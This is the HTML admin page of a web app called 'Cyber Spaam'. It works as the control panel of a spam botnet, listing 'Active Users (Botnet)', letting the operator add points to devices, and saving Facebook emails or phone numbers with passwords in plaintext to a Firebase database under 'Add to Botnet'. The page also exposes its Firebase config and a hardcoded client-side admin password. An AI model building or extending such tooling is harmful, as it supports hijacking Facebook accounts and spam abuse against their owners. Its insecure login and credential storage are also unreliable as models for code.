<!-- language: HTML, file: www/admin.html -->
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Admin - Cyber Spaam</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: sans-serif; background-color: #0a0a0a; color: #ff3333; text-align: center; margin: 0; padding: 20px; }
    .container { max-width: 500px; margin: 40px auto; background: #111; padding: 20px; border-radius: 10px; border: 1px solid #ff3333; box-shadow: 0 0 15px rgba(255, 51, 51, 0.2); }
    h1 { font-size: 24px; text-shadow: 0 0 10px #ff3333; }
    input, textarea { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; outline: none; }
    button { padding: 10px; background: #ff3333; color: #fff; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
    .btn-small { padding: 5px 10px; font-size: 12px; }
    .box { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 5px; text-align: left; }
    .box h3 { margin-top: 0; color: #fff; font-size: 16px; }
    .user-card { background: #222; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 3px solid #00ff41; text-align: left; }
    .user-card p { margin: 5px 0; color: #ccc; font-size: 14px; }
    .user-card b { color: #fff; }
    .points { color: yellow; font-weight: bold; font-size: 16px; }
    .hidden { display: none !important; }
  </style>
</head>
<body>

  <div id="authPanel" class="container">
    <h1>ADMIN ACCESS</h1>
    <input type="password" id="adminPass" placeholder="Enter Admin Password">
    <button onclick="checkPassword()">Login</button>
    <p id="authStatus" style="color:red; font-size:14px;"></p>
    <button style="background:#333; margin-top:20px; width: 100%;" onclick="goBack()">Back to App</button>
  </div>

  <div id="adminPanel" class="container hidden">
    <h1>ADMIN CONTROL</h1>
    
    <div class="box">
      <h3>Active Users (Botnet)</h3>
      <div id="userList" style="max-height: 350px; overflow-y: auto;">
        <p style="color:#888;">Loading users...</p>
      </div>
    </div>

    <div class="box">
      <h3>Add Account (Email/Phone & Password)</h3>
      <input type="text" id="manualEmail" placeholder="Facebook Email or Phone Number">
      <input type="password" id="manualPass" placeholder="Facebook Password">
      <button onclick="addManualAccount()">Add to Botnet</button>
    </div>

    <button style="background:#333; color:#fff; width: 100%;" onclick="goBack()">Back to App</button>
    <div id="adminStatus" style="margin-top:10px; color:#00ff41; font-size: 14px;"></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, push, set, get, child, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
      authDomain: "cyber-spaam.firebaseapp.com",
      databaseURL: "https://cyber-spaam-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "cyber-spaam",
      storageBucket: "cyber-spaam.firebasestorage.app",
      messagingSenderId: "180047004522",
      appId: "1:180047004522:web:470d5c50f2e333916d9b13"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.checkPassword = function() {
      const pass = document.getElementById('adminPass').value;
      if (pass === 'arif123') {
        document.getElementById('authPanel').classList.add('hidden');
        document.getElementById('adminPanel').classList.remove('hidden');
        loadUsers(); 
      } else {
        document.getElementById('authStatus').innerText = "❌ Wrong Password!";
      }
    }

    window.goBack = function() {
      window.location.href = "index.html"; 
    }

    async function loadUsers() {
      const userListDiv = document.getElementById('userList');
      try {
        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, 'users'));
        
        if (snapshot.exists()) {
          const users = snapshot.val();
          userListDiv.innerHTML = ''; 

          for (const [key, data] of Object.entries(users)) {
            const deviceName = data.deviceName || "Unknown Device";
            const points = data.points || 0;

            const card = document.createElement('div');
            card.className = 'user-card';
            card.innerHTML = `
              <p><b>Device:</b> ${deviceName}</p>
              <p><b>Points:</b> <span class="points" id="points-${key}">${points}</span></p>
              <div style="display:flex; gap:5px; margin-top:8px;">
                <input type="number" id="input-${key}" placeholder="Points" style="width:80px; padding:5px; margin:0; border:1px solid #555;">
                <button class="btn-small" onclick="addPoints('${key}')">Add</button>
              </div>
            `;
            userListDiv.appendChild(card);
          }
        } else {
          userListDiv.innerHTML = '<p style="color:#888;">No users found in Botnet.</p>';
        }
      } catch (error) {
        userListDiv.innerHTML = `<p style="color:red;">Error: ${error.message}</p>`;
      }
    }

    window.addPoints = async function(userKey) {
      const inputAmount = document.getElementById(`input-${userKey}`).value;
      const amount = parseInt(inputAmount);
      const status = document.getElementById('adminStatus');
      
      if (isNaN(amount) || amount <= 0) {
        status.innerText = "❌ Please enter a valid number.";
        return;
      }

      try {
        const userRef = ref(db, `users/${userKey}`);
        const snapshot = await get(userRef);
        const currentPoints = snapshot.val().points || 0;
        const newPoints = currentPoints + amount;

        await update(userRef, { points: newPoints });
        
        document.getElementById(`points-${userKey}`).innerText = newPoints;
        document.getElementById(`input-${userKey}`).value = ''; 
        
        status.innerText = `✅ Added ${amount} points. New total: ${newPoints}`;
        setTimeout(() => { status.innerText = ""; }, 3000); 
        
      } catch (error) {
        status.innerText = "❌ Error: " + error.message;
      }
    }

    window.addManualAccount = async function() {
      const email = document.getElementById('manualEmail').value.trim();
      const password = document.getElementById('manualPass').value.trim();
      const status = document.getElementById('adminStatus');
      
      if (!email || !password) return status.innerText = "❌ Please enter email and password";

      try {
        const accRef = ref(db, 'accounts');
        await set(push(accRef), { 
          email: email, 
          password: password,
          type: "credentials"
        });
        
        status.innerText = "✅ Account (Email/Pass) added to Botnet!";
        document.getElementById('manualEmail').value = '';
        document.getElementById('manualPass').value = '';
        setTimeout(() => { status.innerText = ""; }, 3000);
      } catch (e) { status.innerText = "❌ Error: " + e.message; }
    }
  </script>
</body>
</html>
